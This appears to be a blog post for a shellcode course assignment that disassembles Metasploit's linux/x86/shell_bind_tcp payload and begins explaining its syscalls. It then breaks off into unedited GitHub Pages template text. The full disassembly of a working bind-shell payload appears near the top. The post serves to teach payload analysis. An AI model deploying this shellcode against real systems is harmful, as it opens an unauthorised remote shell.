## Assignment #1: Bind TCP Shell
Create a shell_bind_tcp shellcode that binds to a port and execute a shell on an incoming connection, the port number should be easy to configure.

Have you ever generated shellcode with tools like Metasploit and MSFvenom? 
If you have, I'm sure you've wondered what that shellcode actually translates to beyond the generic descriptor "linux/x86/shell_bind_tcp".

I'm going to teach you how to not only read shellcode, but generate your own as well.

There are dozens of approaches you could take to create shellcode, but before we create it, we need to need to understand how it works. 
To understand shellcode we first need to analyze it.

```markdown
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# msfvenom --arch x86 --platform linux --payload linux/x86/shell_bind_tcp R | ndisasm -u -
No encoder specified, outputting raw payload
Payload size: 78 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  5B                pop ebx
00000010  5E                pop esi
00000011  52                push edx
00000012  680200115C        push dword 0x5c110002
00000017  6A10              push byte +0x10
00000019  51                push ecx
0000001A  50                push eax
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
00000020  CD80              int 0x80
00000022  894104            mov [ecx+0x4],eax
00000025  B304              mov bl,0x4
00000027  B066              mov al,0x66
00000029  CD80              int 0x80
0000002B  43                inc ebx
0000002C  B066              mov al,0x66
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```

Now if you're not experienced with assembly I'm sure your very confused right now. That's alright though, we're going to learn what all this means.
Let's start from the top, where the first "int 0x80" instruction is passed. This is known as a syscall instruction, it let's the processor know to interpret the current registers as such.

Moving up 1 position, we see the instruction "mov al,0x66". 0x66 converted to Hex is 102. Every syscall has an integer assigned to it so it can be identified and processed as it's specific function. This syscall (102) points to "socketcall".

```
#define __NR_socketcall         102
#define __NR_syslog             103
#define __NR_setitimer          104
#define __NR_getitimer          105
#define __NR_stat               106
#define __NR_lstat              107
#define __NR_fstat              108
#define __NR_olduname           109
#define __NR_iopl               110
#define __NR_vhangup            111
#define __NR_idle               112
#define __NR_vm86old            113
```



You can use the [editor on GitHub](https://github.com/CryptoBreach/cryptobreach.github.io/edit/main/index.md) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.

### Markdown

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/CryptoBreach/cryptobreach.github.io/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.

